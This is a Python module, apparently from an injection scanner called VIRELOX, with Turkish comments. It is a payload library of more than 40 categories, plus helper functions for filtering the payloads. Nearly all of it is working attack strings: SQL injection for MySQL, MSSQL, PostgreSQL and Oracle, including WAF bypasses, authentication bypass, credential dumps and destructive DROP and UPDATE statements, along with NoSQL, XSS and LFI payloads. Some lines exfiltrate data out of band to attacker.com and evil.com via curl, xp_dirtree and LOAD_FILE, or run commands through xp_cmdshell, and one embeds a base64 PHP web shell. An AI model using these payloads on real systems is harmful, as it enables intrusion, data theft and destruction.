"""
VIRELOX Injection Kütüphanesi v3.0 — 40+ Kategori
Mozilla Public License 2.0 — AltayHR Developers
"""

INJECTION_KUTUPHANESI = {
    # ══ HATA TABANLI ══════════════════════════════════════════════
    "ERROR_TRIGGER": {
        "aciklama": "Hata tetikleyici karakterler",
        "payloadlar": ["'", '"', "`", "\\", "';", '";', "') ", "\")", "1'", "1\""],
        "dbms": ["all"],
    },
    "ERROR_MYSQL_EXTRACTVALUE": {
        "aciklama": "MySQL extractvalue OOB",
        "payloadlar": [
            "1 AND extractvalue(1,concat(0x7e,version()))-- -",
            "' AND extractvalue(1,concat(0x7e,database()))-- -",
            "1 AND extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))-- -",
        ],
        "dbms": ["MySQL","MariaDB"],
    },
    "ERROR_MYSQL_UPDATEXML": {
        "aciklama": "MySQL updatexml OOB",
        "payloadlar": [
            "1 AND updatexml(1,concat(0x7e,version()),1)-- -",
            "' AND updatexml(1,concat(0x7e,user()),1)-- -",
            "1 AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)-- -",
        ],
        "dbms": ["MySQL","MariaDB"],
    },
    "ERROR_MYSQL_FLOOR": {
        "aciklama": "MySQL FLOOR RAND GROUP BY",
        "payloadlar": [
            "1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
            "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
        ],
        "dbms": ["MySQL"],
    },
    "ERROR_MYSQL_EXP": {
        "aciklama": "MySQL exp() double overflow",
        "payloadlar": [
            "1 AND exp(~(SELECT * FROM(SELECT version())a))-- -",
            "' AND exp(~(SELECT * FROM(SELECT user())a))-- -",
        ],
        "dbms": ["MySQL"],
    },
    "ERROR_PG_CAST": {
        "aciklama": "PostgreSQL CAST hata",
        "payloadlar": [
            "' AND 1=cast(version() as int)--",
            "1 AND 1=cast(version() as int)--",
            "' AND 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1) as int)--",
            "';SELECT CAST(version() AS INTEGER)--",
        ],
        "dbms": ["PostgreSQL"],
    },
    "ERROR_MSSQL_CONVERT": {
        "aciklama": "MSSQL CONVERT/CAST hata",
        "payloadlar": [
            "' AND 1=convert(int,@@version)--",
            "1 AND 1=convert(int,@@version)--",
            "' AND 1=convert(int,(SELECT top 1 table_name FROM information_schema.tables))--",
            "'; EXEC xp_cmdshell('whoami')--",
        ],
        "dbms": ["MSSQL"],
    },
    "ERROR_ORACLE_CAST": {
        "aciklama": "Oracle to_number hata",
        "payloadlar": [
            "' AND 1=to_number('a')--",
            "' UNION SELECT NULL FROM dual--",
            "' AND 1=(SELECT COUNT(*) FROM ALL_TABLES)--",
        ],
        "dbms": ["Oracle"],
    },
    "ERROR_GENERIC_QUOTE": {
        "aciklama": "Genel tırnak hata tetikleyicileri",
        "payloadlar": [
            "1'", "1\"", "1`", "1\\", "1;", "1' OR '1'='1",
            "1' AND '1'='1", "1 AND 1=1-- -", "1 OR 1=1-- -",
        ],
        "dbms": ["all"],
    },

    # ══ UNION TABANLI ═════════════════════════════════════════════
    "UNION_1COL":  {"aciklama":"1 kolon","payloadlar":["-1 UNION SELECT 1-- -","' UNION SELECT NULL-- -"],"dbms":["all"]},
    "UNION_2COL":  {"aciklama":"2 kolon","payloadlar":["-1 UNION SELECT 1,2-- -","' UNION SELECT NULL,NULL-- -"],"dbms":["all"]},
    "UNION_3COL":  {"aciklama":"3 kolon","payloadlar":["-1 UNION SELECT 1,2,3-- -","' UNION SELECT NULL,NULL,NULL-- -"],"dbms":["all"]},
    "UNION_4COL":  {"aciklama":"4 kolon","payloadlar":["-1 UNION SELECT 1,2,3,4-- -","' UNION SELECT NULL,NULL,NULL,NULL-- -"],"dbms":["all"]},
    "UNION_5COL":  {"aciklama":"5 kolon","payloadlar":["-1 UNION SELECT 1,2,3,4,5-- -"],"dbms":["all"]},
    "UNION_6COL":  {"aciklama":"6 kolon","payloadlar":["-1 UNION SELECT 1,2,3,4,5,6-- -"],"dbms":["all"]},
    "UNION_7COL":  {"aciklama":"7 kolon","payloadlar":["-1 UNION SELECT 1,2,3,4,5,6,7-- -"],"dbms":["all"]},
    "UNION_8COL":  {"aciklama":"8 kolon","payloadlar":["-1 UNION SELECT 1,2,3,4,5,6,7,8-- -"],"dbms":["all"]},
    "UNION_ALL":   {
        "aciklama": "UNION ALL SELECT",
        "payloadlar": [
            "-1 UNION ALL SELECT NULL-- -",
            "-1 UNION ALL SELECT NULL,NULL-- -",
            "-1 UNION ALL SELECT NULL,NULL,NULL-- -",
        ],
        "dbms": ["MySQL","PostgreSQL","SQLite"],
    },
    "UNION_STRING_TEST": {
        "aciklama": "UNION string kolon tespiti",
        "payloadlar": [
            "-1 UNION SELECT 'VLX','VLX'-- -",
            "-1 UNION SELECT 'VLX','VLX','VLX'-- -",
            "' UNION SELECT 'a'-- -",
        ],
        "dbms": ["all"],
    },

    # ══ BOOLEAN BLIND ═════════════════════════════════════════════
    "BOOLEAN_TRUE":  {"aciklama":"Boolean TRUE","payloadlar":["1 AND 1=1-- -","' AND '1'='1","1 AND TRUE-- -","1 AND 2>1-- -"],"dbms":["all"]},
    "BOOLEAN_FALSE": {"aciklama":"Boolean FALSE","payloadlar":["1 AND 1=2-- -","' AND '1'='2","1 AND FALSE-- -"],"dbms":["all"]},
    "BOOLEAN_AND": {
        "aciklama": "AND tabanlı boolean veri çıkarma",
        "payloadlar": [
            "1 AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'-- -",
            "1 AND LENGTH((SELECT database()))>0-- -",
            "1 AND ASCII(SUBSTRING((SELECT database()),1,1))>64-- -",
            "1 AND (SELECT COUNT(*) FROM users)>0-- -",
        ],
        "dbms": ["MySQL"],
    },
    "BOOLEAN_OR": {
        "aciklama": "OR tabanlı boolean",
        "payloadlar": [
            "' OR 1=1-- -", "' OR '1'='1", "1 OR 1=1-- -",
            "' OR 1=1#", "' OR 1-- -",
        ],
        "dbms": ["all"],
    },
    "BOOLEAN_ISNULL": {
        "aciklama": "IS NULL / IS NOT NULL boolean",
        "payloadlar": [
            "1 AND (SELECT 1) IS NOT NULL-- -",
            "' AND (SELECT NULL) IS NULL-- -",
        ],
        "dbms": ["MySQL","PostgreSQL"],
    },

    # ══ TIME-BASED ════════════════════════════════════════════════
    "TIME_MYSQL_SLEEP": {
        "aciklama": "MySQL SLEEP",
        "payloadlar": [
            "1 AND SLEEP(5)-- -",
            "' AND SLEEP(5)-- -",
            "1 OR SLEEP(5)-- -",
            "1 AND (SELECT * FROM (SELECT SLEEP(5))a)-- -",
            "' AND SLEEP(5) AND '1'='1",
        ],
        "dbms": ["MySQL","MariaDB"],
    },
    "TIME_MYSQL_BENCHMARK": {
        "aciklama": "MySQL BENCHMARK",
        "payloadlar": [
            "1 AND 1=BENCHMARK(5000000,MD5(1))-- -",
            "' AND 1=BENCHMARK(5000000,SHA1('test'))-- -",
        ],
        "dbms": ["MySQL"],
    },
    "TIME_MSSQL_WAITFOR": {
        "aciklama": "MSSQL WAITFOR DELAY",
        "payloadlar": [
            "1; WAITFOR DELAY '0:0:5'--",
            "'; WAITFOR DELAY '0:0:5'--",
            "1 AND 1=1; WAITFOR DELAY '0:0:5'--",
        ],
        "dbms": ["MSSQL"],
    },
    "TIME_PG_SLEEP": {
        "aciklama": "PostgreSQL pg_sleep",
        "payloadlar": [
            "1;SELECT pg_sleep(5)--",
            "' AND (SELECT 1 FROM pg_sleep(5))='1",
            "1 AND 1=(SELECT 1 FROM pg_sleep(5))-- -",
        ],
        "dbms": ["PostgreSQL"],
    },
    "TIME_ORACLE_PIPE": {
        "aciklama": "Oracle DBMS_PIPE",
        "payloadlar": [
            "1 AND 1=1 AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)-- -",
            "' AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)=1--",
        ],
        "dbms": ["Oracle"],
    },
    "TIME_SQLITE_RANDOMBLOB": {
        "aciklama": "SQLite RANDOMBLOB",
        "payloadlar": [
            "1 AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000))))-- -",
        ],
        "dbms": ["SQLite"],
    },

    # ══ STACKED QUERIES ═══════════════════════════════════════════
    "STACKED_SELECT": {
        "aciklama": "Stacked SELECT",
        "payloadlar": [
            "1; SELECT 1-- -",
            "'; SELECT version()-- -",
            "1; SELECT sleep(0)-- -",
        ],
        "dbms": ["MySQL","MSSQL","PostgreSQL"],
    },
    "STACKED_INSERT": {
        "aciklama": "Stacked INSERT",
        "payloadlar": [
            "'; INSERT INTO users(username,password) VALUES('hacker','hacked')--",
            "1; INSERT INTO users VALUES(9999,'virelox','pwned','test@test.com')--",
        ],
        "dbms": ["MySQL","MSSQL","PostgreSQL"],
    },
    "STACKED_UPDATE": {
        "aciklama": "Stacked UPDATE",
        "payloadlar": [
            "'; UPDATE users SET password='pwned' WHERE 1=1--",
            "1; UPDATE users SET role='admin' WHERE username='admin'--",
        ],
        "dbms": ["MySQL","MSSQL"],
    },

    # ══ OUT-OF-BAND ════════════════════════════════════════════════
    "OOB_DNS_MYSQL": {
        "aciklama": "MySQL DNS sızdırma",
        "payloadlar": [
            "' AND LOAD_FILE(CONCAT('\\\\\\\\',version(),'.attacker.com\\\\a'))-- -",
            "1 AND (SELECT 1 FROM (SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,version(),0x2e61747461636b65722e636f6d5c5c61)))a)-- -",
        ],
        "dbms": ["MySQL"],
    },
    "OOB_DNS_MSSQL": {
        "aciklama": "MSSQL DNS sızdırma",
        "payloadlar": [
            "; EXEC master..xp_dirtree '//attacker.com/a'--",
            "; EXEC master..xp_fileexist '//attacker.com/a'--",
        ],
        "dbms": ["MSSQL"],
    },
    "OOB_PG_COPY": {
        "aciklama": "PostgreSQL COPY TO sızdırma",
        "payloadlar": [
            "'; COPY (SELECT version()) TO PROGRAM 'curl http://attacker.com'--",
        ],
        "dbms": ["PostgreSQL"],
    },

    # ══ WAF BYPASS ════════════════════════════════════════════════
    "WAF_BYPASS_COMMENT": {
        "aciklama": "Yorum ile boşluk bypass",
        "payloadlar": [
            "'/**/UNION/**/SELECT/**/NULL-- -",
            "1/**/AND/**/1=1-- -",
            "'/*!UNION*//*!SELECT*/NULL-- -",
            "1/*!AND*/1=1-- -",
        ],
        "dbms": ["MySQL"],
    },
    "WAF_BYPASS_CASE": {
        "aciklama": "Mixed case bypass",
        "payloadlar": [
            "' UniOn SeLeCt NULL-- -",
            "1 aNd 1=1-- -",
            "' uNiOn sElEcT 1,2-- -",
            "' UnIoN aLl SeLeCt NuLl-- -",
        ],
        "dbms": ["all"],
    },
    "WAF_BYPASS_ENCODE": {
        "aciklama": "URL encode bypass",
        "payloadlar": [
            "%27%20UNION%20SELECT%20NULL--",
            "1%20AND%201%3D1--",
            "%27%20OR%20%271%27%3D%271",
        ],
        "dbms": ["all"],
    },
    "WAF_BYPASS_DOUBLE_ENCODE": {
        "aciklama": "Çift URL encode",
        "payloadlar": [
            "%2527%2520UNION%2520SELECT%2520NULL--",
            "%2527%2520AND%25201%253D1--",
        ],
        "dbms": ["all"],
    },
    "WAF_BYPASS_NEWLINE": {
        "aciklama": "Newline / whitespace bypass",
        "payloadlar": [
            "'\r\nUNION\r\nSELECT\r\nNULL--",
            "1\r\nAND\r\n1=1--",
            "'\nOR\n1=1--",
            "1%0aAND%0a1=1--",
        ],
        "dbms": ["all"],
    },
    "WAF_BYPASS_INLINE_COMMENT": {
        "aciklama": "MySQL inline comment bypass",
        "payloadlar": [
            "/*!50000 UNION*/ SELECT NULL-- -",
            "1 /*!AND*/ 1=1-- -",
            "' /*!UNION*/ /*!SELECT*/ NULL,NULL-- -",
            "/*!50000SELECT*/ version()-- -",
        ],
        "dbms": ["MySQL"],
    },
    "WAF_BYPASS_NULLBYTE": {
        "aciklama": "Null byte bypass",
        "payloadlar": [
            "1%00 AND 1=1-- -",
            "' %00 OR '1'='1",
        ],
        "dbms": ["all"],
    },
    "WAF_BYPASS_PLUS": {
        "aciklama": "Plus space bypass",
        "payloadlar": [
            "'+AND+1=1-- -",
            "'+UNION+SELECT+NULL-- -",
        ],
        "dbms": ["MySQL"],
    },

    # ══ AUTH BYPASS ════════════════════════════════════════════════
    "AUTH_BYPASS": {
        "aciklama": "Authentication bypass",
        "payloadlar": [
            "' OR '1'='1'--", "' OR 1=1--", "admin'--",
            "' OR 'x'='x", "') OR ('1'='1",
            "1' OR '1'='1'/*", "' OR 1=1 LIMIT 1--",
            "' OR 1-- -", "admin' #",
            "' OR 1=1 #", "' OR TRUE--",
        ],
        "dbms": ["all"],
    },

    # ══ SECOND ORDER ══════════════════════════════════════════════
    "SECOND_ORDER": {
        "aciklama": "Second order injection",
        "payloadlar": [
            "admin'-- -",
            "'; UPDATE users SET password='hacked'--",
            "admin')-- -",
        ],
        "dbms": ["all"],
    },

    # ══ BLIND EXTRACTION ══════════════════════════════════════════
    "BLIND_EXTRACT_SUBSTR": {
        "aciklama": "SUBSTRING/MID tabanlı çıkarma",
        "payloadlar": [
            "1 AND SUBSTRING(version(),1,1)='5'-- -",
            "1 AND MID(database(),1,1)='a'-- -",
            "1 AND LENGTH(database())=5-- -",
            "1 AND ASCII(SUBSTRING((SELECT database()),1,1))=109-- -",
        ],
        "dbms": ["MySQL"],
    },
    "BLIND_EXTRACT_CASE": {
        "aciklama": "CASE WHEN tabanlı çıkarma",
        "payloadlar": [
            "1 AND (CASE WHEN (1=1) THEN 1 ELSE 0 END)=1-- -",
            "' AND (CASE WHEN (LENGTH(database())>0) THEN 1 ELSE 0 END)=1-- -",
        ],
        "dbms": ["MySQL","PostgreSQL","SQLite"],
    },

    # ══ XSS ═══════════════════════════════════════════════════════
    "XSS_BASIC": {
        "aciklama": "Temel XSS",
        "payloadlar": [
            "<script>alert(1)</script>",
            "'\"><script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<details open ontoggle=alert(1)>",
        ],
        "dbms": ["XSS"],
    },
    "XSS_POLYGLOT": {
        "aciklama": "Polyglot XSS",
        "payloadlar": [
            "jaVasCript:alert(1)//%0D%0A",
            "'\"><script>alert(1)</script>",
            "<svg/onload=alert(1)>",
            "--><script>alert(1)</script>",
            "</script><script>alert(1)</script>",
        ],
        "dbms": ["XSS"],
    },
    "XSS_ENCODE": {
        "aciklama": "Encode edilmiş XSS",
        "payloadlar": [
            "%3Cscript%3Ealert(1)%3C/script%3E",
            "&#60;script&#62;alert(1)&#60;/script&#62;",
            "<ScRiPt>alert(1)</ScRiPt>",
        ],
        "dbms": ["XSS"],
    },

    # ══ LFI ═══════════════════════════════════════════════════════
    "LFI_BASIC": {
        "aciklama": "Temel LFI",
        "payloadlar": [
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "../../../../../etc/passwd",
            "../../../../../../etc/passwd",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "/etc/passwd",
            "/proc/self/environ",
            "..\\..\\..\\windows\\win.ini",
            "php://filter/convert.base64-encode/resource=index.php",
        ],
        "dbms": ["LFI"],
    },
    "LFI_WRAPPER": {
        "aciklama": "PHP wrapper LFI",
        "payloadlar": [
            "php://filter/convert.base64-encode/resource=config.php",
            "php://filter/read=string.rot13/resource=index.php",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
            "expect://id",
        ],
        "dbms": ["LFI"],
    },
}


# ── v4.0 EK PAYLOAD KATEGORİLERİ ─────────────────────────────────────────────

INJECTION_KUTUPHANESI["UNION_COLUMNCOUNT_DEEP"] = {
    "aciklama": "UNION kolon sayısı tespiti — 1-90 arası kapsamlı",
    "payloadlar": [
        f"' ORDER BY {n}-- -" for n in range(1, 91)
    ] + [
        f"' UNION SELECT {'NULL,'*(n-1)}NULL-- -" for n in range(1, 31)
    ],
    "dbms": ["MySQL", "MariaDB", "PostgreSQL", "SQLite"],
}

INJECTION_KUTUPHANESI["ERROR_PGSQL"] = {
    "aciklama": "PostgreSQL hata tabanlı payloadlar",
    "payloadlar": [
        "' AND 1=CAST(version() AS INTEGER)-- -",
        "' AND 1=CAST(current_database() AS INTEGER)-- -",
        "' AND 1=CAST(current_user AS INTEGER)-- -",
        "1; SELECT 1/0-- -",
        "' AND (SELECT 1 FROM pg_sleep(0))-- -",
        "' AND 1=(SELECT 1 FROM pg_tables WHERE schemaname=pg_sleep(0))-- -",
        "1 AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)-- -",
        "' AND extractvalue(1,version())-- -",
        "' UNION SELECT NULL,NULL,version()-- -",
        "'; SELECT pg_sleep(0)-- -",
    ],
    "dbms": ["PostgreSQL"],
}

INJECTION_KUTUPHANESI["ERROR_MSSQL_ADV"] = {
    "aciklama": "MSSQL gelişmiş hata tabanlı",
    "payloadlar": [
        "' AND 1=CONVERT(int,@@version)-- -",
        "' AND 1=CONVERT(int,db_name())-- -",
        "' AND 1=CONVERT(int,user_name())-- -",
        "'; EXEC xp_cmdshell('dir')-- -",
        "'; EXEC xp_dirtree('//evil.com/a')-- -",
        "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))-- -",
        "' AND 1=CONVERT(int,(SELECT TOP 1 column_name FROM information_schema.columns))-- -",
        "' AND CHARINDEX('sa',user_name())>0-- -",
        "'; WAITFOR DELAY '0:0:1'-- -",
        "'; INSERT INTO logs VALUES('pwned')-- -",
    ],
    "dbms": ["MSSQL"],
}

INJECTION_KUTUPHANESI["ERROR_ORACLE_ADV"] = {
    "aciklama": "Oracle hata tabanlı — gelişmiş",
    "payloadlar": [
        "' AND 1=CTXSYS.DRITHSX.SN(USER,1337) FROM DUAL-- -",
        "' AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||user||CHR(62))) FROM DUAL)-- -",
        "' AND 1=UTL_INADDR.get_host_name(version)-- -",
        "' UNION SELECT NULL,NULL,banner FROM v$version-- -",
        "' UNION SELECT NULL,NULL,SYS.DATABASE_NAME FROM DUAL-- -",
        "' AND 1=(SELECT 1 FROM dual WHERE 1=1)-- -",
        "' AND ROWNUM=1-- -",
        "' OR 1=1-- -",
    ],
    "dbms": ["Oracle"],
}

INJECTION_KUTUPHANESI["BLIND_BOOL_ADV"] = {
    "aciklama": "Boolean blind — gelişmiş teknikler",
    "payloadlar": [
        # Substring tabanlı boolean
        "' AND SUBSTRING(version(),1,1)='5'-- -",
        "' AND SUBSTRING(database(),1,1)='a'-- -",
        "' AND SUBSTRING(user(),1,4)='root'-- -",
        "' AND LENGTH(database())>3-- -",
        "' AND LENGTH(database())=8-- -",
        # ASCII tabanlı
        "' AND ASCII(SUBSTRING(version(),1,1))>52-- -",
        "' AND ASCII(SUBSTRING(database(),1,1))>96-- -",
        "' AND ASCII(SUBSTRING(user(),1,1))=114-- -",
        # Tablo kontrol
        "' AND (SELECT COUNT(*) FROM information_schema.tables)>0-- -",
        "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>0-- -",
        # CASE tabanlı
        "' AND CASE WHEN (1=1) THEN 1 ELSE 0 END-- -",
        "' AND CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN 1 ELSE 0 END-- -",
        # IF tabanlı
        "' AND IF(1=1,1,0)-- -",
        "' AND IF(LENGTH(database())>0,1,0)-- -",
        "' AND IF(SUBSTR(database(),1,1)='a',1,0)-- -",
        # XOR tekniği
        "' XOR (SELECT 1 FROM(SELECT SLEEP(0))a)-- -",
        # In operatörü
        "' AND database() IN (SELECT schema_name FROM information_schema.schemata)-- -",
    ],
    "dbms": ["MySQL", "MariaDB"],
}

INJECTION_KUTUPHANESI["TIME_ADVANCED"] = {
    "aciklama": "Time based — gelişmiş ve conditional",
    "payloadlar": [
        "' AND SLEEP(1)-- -",
        "' AND SLEEP(2)-- -",
        "' AND IF(1=1,SLEEP(1),0)-- -",
        "' AND IF(LENGTH(database())>3,SLEEP(1),0)-- -",
        "' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(1),0)-- -",
        "'; WAITFOR DELAY '0:0:1'-- -",
        "'; SELECT pg_sleep(1)-- -",
        "' OR SLEEP(1)-- -",
        "1 AND SLEEP(1)-- -",
        "1 OR SLEEP(1)-- -",
        "' AND (SELECT * FROM (SELECT(SLEEP(1)))a)-- -",
        "' AND (SELECT 1 FROM(SELECT SLEEP(1))A)-- -",
        "' UNION SELECT SLEEP(1)-- -",
        "'; EXEC WAITFOR DELAY '0:0:1'-- -",
        "' AND 1=BENCHMARK(3000000,MD5(1))-- -",
        "' AND BENCHMARK(5000000,SHA1('test'))-- -",
    ],
    "dbms": ["MySQL", "MariaDB", "MSSQL", "PostgreSQL"],
}

INJECTION_KUTUPHANESI["UNION_TEXT_DETECT"] = {
    "aciklama": "UNION SELECT metin kolon tespiti",
    "payloadlar": [
        "' UNION SELECT 'VIRELOX',NULL,NULL-- -",
        "' UNION SELECT NULL,'VIRELOX',NULL-- -",
        "' UNION SELECT NULL,NULL,'VIRELOX'-- -",
        "' UNION SELECT NULL,NULL,NULL,'VIRELOX'-- -",
        "' UNION SELECT NULL,NULL,NULL,NULL,'VIRELOX'-- -",
        "' UNION SELECT 'VIRELOX_1','VIRELOX_2',NULL-- -",
        "' UNION SELECT 0x5649524f4c4f58,NULL,NULL-- -",  # hex VIRELOX
        "' UNION SELECT CHAR(86,73,82,69,76,79,88),NULL,NULL-- -",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL,'VIRELOX'-- -",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,'VIRELOX'-- -",
    ],
    "dbms": ["MySQL", "MariaDB", "PostgreSQL", "SQLite"],
}

INJECTION_KUTUPHANESI["DUMP_ADVANCED"] = {
    "aciklama": "Veri çekme — gelişmiş teknikler",
    "payloadlar": [
        # GROUP_CONCAT ile toplu dump
        "' UNION SELECT GROUP_CONCAT(table_name SEPARATOR ','),NULL,NULL FROM information_schema.tables WHERE table_schema=database()-- -",
        "' UNION SELECT GROUP_CONCAT(column_name SEPARATOR ','),NULL,NULL FROM information_schema.columns WHERE table_name='users'-- -",
        "' UNION SELECT GROUP_CONCAT(username,':',password SEPARATOR '\n'),NULL,NULL FROM users-- -",
        # LIMIT ile sayfalama
        "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables LIMIT 0,1-- -",
        "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables LIMIT 1,1-- -",
        "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables LIMIT 2,1-- -",
        # INTO OUTFILE
        "' UNION SELECT 1,2,3 INTO OUTFILE '/tmp/test.txt'-- -",
        # LOAD_FILE
        "' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL-- -",
        # JSON dump
        "' UNION SELECT JSON_OBJECT('tables',GROUP_CONCAT(table_name)),NULL,NULL FROM information_schema.tables WHERE table_schema=database()-- -",
    ],
    "dbms": ["MySQL", "MariaDB"],
}

INJECTION_KUTUPHANESI["HEADER_INJECTION"] = {
    "aciklama": "HTTP header injection payloadları",
    "payloadlar": [
        "1' AND SLEEP(1)-- -",
        "1 AND SLEEP(1)-- -",
        "' OR '1'='1",
        "admin'-- -",
        "' OR 1=1-- -",
        "'; DROP TABLE users-- -",
        "1; WAITFOR DELAY '0:0:1'-- -",
    ],
    "dbms": ["MySQL", "MSSQL", "PostgreSQL"],
}

INJECTION_KUTUPHANESI["WAF_BYPASS_SQLI"] = {
    "aciklama": "WAF bypass odaklı SQL injection — encode/obfuscate",
    "payloadlar": [
        # Comment split
        "' UN/**/ION SE/**/LECT NULL,NULL,NULL-- -",
        "' /*!UNION*/ /*!SELECT*/ NULL,NULL,NULL-- -",
        "' /*!50000UNION*/ /*!50000SELECT*/ NULL,NULL,NULL-- -",
        # Case obfuscation
        "' uNiOn SeLeCt NULL,NULL,NULL-- -",
        "' UnIoN sElEcT NULL,NULL,NULL-- -",
        # URL encode
        "' %55NION %53ELECT NULL,NULL,NULL-- -",
        "' %u0055NION %u0053ELECT NULL,NULL,NULL-- -",
        # Null byte
        "'%00 UNION SELECT NULL,NULL,NULL-- -",
        # Double encode
        "' %2555NION %2553ELECT NULL,NULL,NULL-- -",
        # Newline injection
        "'\nUNION\nSELECT\nNULL,NULL,NULL-- -",
        # Tab injection
        "'\tUNION\tSELECT\tNULL,NULL,NULL-- -",
        # HTML entity
        "' &#85;NION SELECT NULL,NULL,NULL-- -",
        # Parenthesis
        "' UNION(SELECT(NULL),(NULL),(NULL))-- -",
        # Backtick
        "' UNION SELECT `NULL`,`NULL`,`NULL`-- -",
    ],
    "dbms": ["MySQL", "MariaDB"],
}

INJECTION_KUTUPHANESI["STACKED_ADVANCED"] = {
    "aciklama": "Stacked queries — gelişmiş",
    "payloadlar": [
        "'; SELECT 1-- -",
        "'; SELECT version()-- -",
        "'; SELECT database()-- -",
        "'; SELECT user()-- -",
        "'; SELECT sleep(1)-- -",
        "'; CREATE TABLE pwned(id int)-- -",
        "'; DROP TABLE IF EXISTS pwned-- -",
        "'; INSERT INTO logs VALUES(1,'pwned')-- -",
        "'; UPDATE users SET password='hacked' WHERE id=1-- -",
        "'; EXEC xp_cmdshell('whoami')-- -",
    ],
    "dbms": ["MySQL", "MSSQL", "PostgreSQL"],
}

INJECTION_KUTUPHANESI["OOB_DNS"] = {
    "aciklama": "Out-of-band DNS exfiltration",
    "payloadlar": [
        "' AND LOAD_FILE(CONCAT('\\\\\\\\',version(),'.evil.com\\\\test'))-- -",
        "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',database(),'.evil.com\\\\x'))-- -",
        "'; EXEC xp_dirtree '//'+@@version+'.evil.com/a'-- -",
        "'; EXEC master..xp_cmdshell 'ping '+@@servername+'.evil.com'-- -",
        "' AND 1=(SELECT 1 FROM(SELECT SLEEP(1))A)-- -",
    ],
    "dbms": ["MySQL", "MSSQL"],
}

INJECTION_KUTUPHANESI["NOSQL_MONGO"] = {
    "aciklama": "NoSQL / MongoDB injection",
    "payloadlar": [
        "'; return true; var x='",
        "'; return true; //",
        "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}",
        "{\"$where\": \"1 == 1\"}",
        "{\"username\": {\"$regex\": \".*\"}}",
        "' || '1'=='1",
        "admin' || '1'=='1",
        "'; return db.getCollectionNames()//",
    ],
    "dbms": ["MongoDB", "NoSQL"],
}

INJECTION_KUTUPHANESI["SECOND_ORDER"] = {
    "aciklama": "Second-order SQL injection",
    "payloadlar": [
        "admin'-- -",
        "' OR 1=1-- -",
        "test' UNION SELECT 1,2,3-- -",
        "1' AND '1'='1",
        "a'); DROP TABLE users-- -",
        "test'/**/OR/**/1=1-- -",
    ],
    "dbms": ["MySQL", "MSSQL", "PostgreSQL", "SQLite"],
}


INJECTION_SAYISI = len(INJECTION_KUTUPHANESI)
TOPLAM_PAYLOAD_SAYISI = sum(len(v["payloadlar"]) for v in INJECTION_KUTUPHANESI.values())


def tum_payloadlari_al(kategori=None):
    if kategori and kategori in INJECTION_KUTUPHANESI:
        return INJECTION_KUTUPHANESI[kategori]["payloadlar"]
    tumu = []
    for v in INJECTION_KUTUPHANESI.values():
        tumu.extend(v["payloadlar"])
    return tumu


def kategori_filtrele(dbms):
    return {k: v for k, v in INJECTION_KUTUPHANESI.items()
            if dbms in v.get("dbms",[]) or "all" in v.get("dbms",[])}
